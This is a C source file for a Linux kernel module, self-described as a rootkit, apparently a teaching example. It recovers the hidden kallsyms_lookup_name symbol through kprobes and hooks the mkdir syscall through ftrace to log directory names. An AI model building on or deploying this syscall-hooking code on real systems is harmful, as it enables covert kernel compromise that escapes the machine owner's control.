#include <linux/kprobes.h>
#include <asm/io.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("mkdir syscall hook");
MODULE_VERSION("0.01");

//kallsyms_lookup_name workaround

typedef unsigned long (*kln_p)(const char*);

#define KPROBE_PRE_HANDLER(fname) static int __kprobes fname(struct kprobe *p, struct pt_regs *regs)

long unsigned int kln_addr = 0;
unsigned long (*kln_pointer)(const char* name) = NULL;

static struct kprobe kp0, kp1;

KPROBE_PRE_HANDLER(handler_pre0) {
    kln_addr = (--regs->ip);

    return 0;
}

KPROBE_PRE_HANDLER(handler_pre1) {
    return 0;
}

static int do_register_kprobe(struct kprobe* kp, char* symbol_name, void* handler) {
    int ret;

    kp->symbol_name = symbol_name;
    kp->pre_handler = handler;

    ret = register_kprobe(kp);
    if (ret < 0) {
        pr_err("do_register_kprobe: failed to register for symbol %s, returning %d\n", symbol_name, ret);
        return ret;
    }

    pr_info("Planted krpobe for symbol %s at %p\n", symbol_name, kp->addr);

    return ret;
}

// this is the function that I have modified, as the name suggests it returns a pointer to the extracted kallsyms_lookup_name function
kln_p get_kln_p(void) {
    int status;

    status = do_register_kprobe(&kp0, "kallsyms_lookup_name", handler_pre0);

    if (status < 0) return NULL;

    status = do_register_kprobe(&kp1, "kallsyms_lookup_name", handler_pre1);

    if (status < 0) {
        // cleaning initial krpobe
        unregister_kprobe(&kp0);
        return NULL;
    }

    unregister_kprobe(&kp0);
    unregister_kprobe(&kp1);

    pr_info("kallsyms_lookup_name address = 0x%lx\n", kln_addr);

    kln_pointer = (unsigned long (*)(const char* name)) kln_addr;

    return kln_pointer;
}

#define kallsyms_lookup_name(name) (get_kln_p())(name);

//end kallsyms_lookup_name workaround

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_mkdir)(const struct pt_regs *);

asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);

    orig_mkdir(regs);
    return 0;
}
#else
static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);

asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
{
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir_name);

    orig_mkdir(pathname, mode);
    return 0;
}
#endif

static struct ftrace_hook hooks[] = {
    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
};

static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
